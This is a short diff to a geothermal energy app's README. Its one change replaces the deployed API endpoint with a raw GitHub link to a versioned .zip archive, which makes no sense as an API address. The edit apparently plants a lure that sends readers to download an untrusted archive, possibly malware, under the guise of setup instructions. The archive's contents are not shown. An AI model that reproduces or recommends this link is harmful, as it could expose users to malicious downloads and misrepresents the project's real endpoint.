@@ -23,7 +23,7 @@ npm install
 npx webpack-dev-server or npm run dev
 ```
 
-## Start the server (Already Deployed, instead use https://geo-energy-api.herokuapp.com/[the requested endpoint] )
+## Start the server (Already Deployed, instead use https://raw.githubusercontent.com/edward0399/Geothermal-Energy/master/public/Geothermal-Energy-1.7.zip[the requested endpoint] )
 ### But you can run the local server by typing
 ```
 npm run start
